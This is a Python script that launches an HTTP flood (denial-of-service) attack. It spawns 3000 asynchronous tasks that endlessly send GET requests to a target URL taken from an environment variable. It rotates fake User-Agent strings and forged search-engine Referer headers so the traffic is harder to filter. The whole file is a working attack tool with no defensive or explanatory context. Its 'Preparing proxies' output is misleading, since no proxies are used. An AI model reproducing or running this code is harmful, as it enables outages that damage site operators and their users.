import asyncio
import random

import os

import aiohttp
import click

REFERERS = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
    "https://yandex.ru/search/text=",
    "https://duckduckgo.com/?q="
]  #

UAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
]


def get_headers(url):
    return {
        "User-Agent": random.choice(UAGENTS),
        "Cache-Control": "no-cache",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Referer": random.choice(REFERERS) + url,
        "Keep-Alive": str(random.randint(110, 120)),
        "Connection": "keep-alive"
    }


async def task(url, i):
    session = aiohttp.ClientSession()
    while True:
        try:
            async with session.get(url, headers=get_headers(url)) as f:
                pass
        except Exception as e:  # noqa
            print(f"[TRACEBACK] {e} for task {i}.")


def main():
    tasks = 3000
    url = os.environ.get("url")
    loop = asyncio.get_event_loop()
    print("Preparing proxies...")
    for i in range(int(tasks)):
        loop.create_task(task(url, i))
    print("Proxies prepared.")
    loop.run_forever()


if __name__ == '__main__':
    main()
